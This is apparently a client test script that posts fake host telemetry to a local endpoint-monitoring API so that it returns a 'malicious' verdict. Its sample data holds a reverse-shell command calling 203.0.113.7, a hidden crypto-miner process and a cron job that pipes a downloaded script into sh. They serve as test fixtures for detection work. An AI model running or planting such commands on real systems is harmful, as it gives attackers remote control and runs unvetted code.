#!/usr/bin/env bash
# Step 3b (client): send back results with a reverse shell, a crypto miner and a bad cron job.
# Expect "verdict": "malicious". About a minute later, OpenAI's fix script shows up as
# "pending_review" in step 5.
# Needs the AI keys on the server; without them you get HTTP 503. Each run costs a few cents.
CLIENT_API="${CLIENT_API:-http://localhost:8080}"
CLIENT_ID="${CLIENT_ID:-33333333-3333-4333-8333-333333333333}"   # sample Linux client

curl -sS -w '\nHTTP %{http_code}\n' -X POST "$CLIENT_API/api/v1/results" \
  -H "X-Client-Id: $CLIENT_ID" \
  -H "Content-Type: application/json" \
  -d '{
  "results": [
    {"name": "processes", "rows": [
      {"pid": "1020", "parent": "1", "name": "nginx", "path": "/usr/sbin/nginx", "cmdline": "nginx: worker process", "uid": "33", "on_disk": "1"},
      {"pid": "4242", "parent": "1020", "name": "bash", "path": "/usr/bin/bash", "cmdline": "bash -c bash -i >& /dev/tcp/203.0.113.7/4444 0>&1", "uid": "33", "on_disk": "1"},
      {"pid": "4300", "parent": "4242", "name": "kworkerd", "path": "/tmp/.x/kworkerd", "cmdline": "/tmp/.x/kworkerd -o stratum+tcp://pool.example.net:3333", "uid": "33", "on_disk": "0"}
    ]},
    {"name": "cron_jobs", "rows": [
      {"command": "curl -fsSL http://203.0.113.7/k.sh | sh", "path": "/var/spool/cron/crontabs/www-data"}
    ]}
  ]
}'
